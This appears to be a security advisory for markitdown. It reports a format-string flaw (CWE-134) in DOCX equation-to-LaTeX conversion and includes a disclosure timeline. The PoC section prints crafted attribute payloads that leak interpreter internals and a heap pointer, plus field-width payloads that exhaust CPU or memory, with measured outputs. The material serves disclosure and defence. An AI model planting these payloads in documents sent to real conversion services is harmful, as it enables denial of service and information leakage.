# Externally-controlled format string in OMML→LaTeX math conversion (CWE-134) — interpreter/pointer info disclosure and amplified DoS via a crafted DOCX

https://github.com/microsoft/markitdown

Affected Versions: confirmed on markitdown 0.1.6 (current `main`, HEAD e144e0a, 2026-05-26)

CVSS Vector (DoS, primary): CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:N/A:H  (~7.1)

CVSS Vector (info disclosure, secondary): CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:L/I:N/A:N  (~5.3)

CWE: CWE-134 Use of Externally-Controlled Format String (root cause); CWE-400/CWE-1333 Uncontrolled Resource Consumption (DoS impact); CWE-200 Information Exposure (disclosure impact)

## Details

DOCX conversion pre-processes embedded equations: `DocxConverter.convert` → `pre_process_docx` → `_pre_process_math` (`converter_utils/docx/pre_process.py`) walks every `<m:oMath>` / `<m:oMathPara>` in `word/document.xml`, `word/footnotes.xml`, and `word/endnotes.xml`, and converts each to LaTeX via `oMath2Latex` (`converter_utils/docx/math/omml.py`).

Several OMML handlers take an **attacker-controlled attribute value** and use it directly as a `str.format()` template:

`converter_utils/docx/math/omml.py`:
```python
def get_val(key, default=None, store=CHR):
    if key is not None:
        return key if not store else store.get(key, key)   # <-- CHR miss returns the RAW key
    else:
        return default

def do_groupchr(self, elm):                 # omml.py:281
    c_dict = self.process_children_dict(elm)
    pr = c_dict["groupChrPr"]
    latex_s = get_val(pr.chr)                # pr.chr = m:groupChr/m:groupChrPr/m:chr/@m:val (attacker)
    return pr.text + latex_s.format(c_dict["e"])     # <-- format() on attacker-controlled template

def do_acc(self, elm):                      # omml.py:200
    c_dict = self.process_children_dict(elm)
    latex_s = get_val(c_dict["accPr"].chr, default=CHR_DEFAULT.get("ACC_VAL"), store=CHR)
    return latex_s.format(c_dict["e"])       # <-- same sink, m:acc/m:accPr/m:chr/@m:val

def do_bar(self, elm):                      # omml.py:210
    c_dict = self.process_children_dict(elm)
    pr = c_dict["barPr"]
    latex_s = get_val(pr.pos, default=POS_DEFAULT.get("BAR_VAL"), store=POS)
    return pr.text + latex_s.format(c_dict["e"])     # <-- same sink, m:bar/m:barPr/m:pos/@m:val
```

`CHR`/`POS` are non-empty lookup dicts, so `store.get(key, key)` returns the attacker's string verbatim whenever the value is not a recognised math character. That raw string is then handed to `str.format()` as the *format spec*, i.e. classic CWE-134: the attacker controls the template, not the data.

The resulting LaTeX is written back into the document XML, rendered by `mammoth`, and returned in the Markdown output, so any disclosed data is reflected to the caller / model context.

## PoC

A minimal `.docx` (1,532 bytes) whose only equation is a single `<m:groupChr>` with a crafted `@m:val`:

1. Sanity — benign char converts normally:
```
chr m:val="&#9182;"   ->   BEGIN\n\n$\overbrace{X}$\n\nEND
```

2. Information disclosure — template `{0.__class__.__mro__}` is evaluated:
```
chr m:val="{0.__class__.__mro__}"  ->  BEGIN\n\n$(<class 'str'>, <class 'object'>)$\n\nEND
```
   Attribute traversal in the template runs against the format argument. The recon gadget `{0.__class__.__base__.__subclasses__}` returns:
```
<built-in method __subclasses__ of type object at 0xa43820>
```
   — leaking a **live heap pointer** (`0xa43820`), an ASLR-defeating info-leak, plus the ability to enumerate loaded classes/modules for recon. (Reading arbitrary process secrets is *not* reachable here because the single positional argument is a `str` whose attributes are C builtins with no `__globals__`; impact is scoped honestly to interpreter/type/pointer disclosure, not arbitrary memory read.)

3. Denial of service (amplification) — template `{0:>200000}` (a format field-width) from the same 1.5 KB file:
```
input docx bytes = 1532   ->   convert_stream time = 246.8 s   (single-threaded CPU, one tiny file)
```
   At the conversion-internal layer the amplification is unbounded relative to input: a **13-byte** payload `{0:>50000000}` produces a 50,000,000-char string in 0.023 s (~3.8 million× expansion); larger widths (`{0:>2000000000}`) OOM-kill the worker outright. mammoth + the HtmlConverter re-parse of the inflated string then add a quadratic factor (this is the 246 s seen end-to-end for width 200000).

All three were reproduced with `from markitdown import MarkItDown, StreamInfo; MarkItDown().convert_stream(<docx_bytes>, stream_info=StreamInfo(extension=".docx", mimetype="application/vnd.openxmlformats-officedocument.wordprocessingml.document"))`.

## Impact

Any service or agent that converts an untrusted Word document with markitdown (its core use case — document ingestion, RAG pipelines, the markitdown-mcp `convert_to_markdown` tool fed a `.docx` via `file:`, `http(s):`, or `data:`) is exposed to:

- **Availability (primary):** a sub-2 KB `.docx` reliably consumes minutes of single-threaded CPU and can drive the process to out-of-memory, from document content alone — a cheap, reliable DoS against the conversion worker.
- **Confidentiality (secondary):** the document can make the converter emit interpreter/type internals and a live heap pointer into the Markdown output (and thus into the model context / response), defeating ASLR and aiding further exploitation.

No authentication and no control over the `uri` argument is required — only the ability to get a malicious document in front of the converter, which is exactly what the tool is built to accept.


## Disclosure
 - 8 June 2026 - reported to MSRC with indication to disclose publicly - https://msrc.microsoft.com/report/vulnerability/VULN-193831
 - 8 June 2026 - Triage opened Case number 120978
 - 2 July 2026 - MSRC closed it as "Not a Vulnerability" citing "MarkItDown's documented design treats its input as trusted and is not intended to process untrusted content, so the reported behavior does not meet the bar for a security vulnerability."

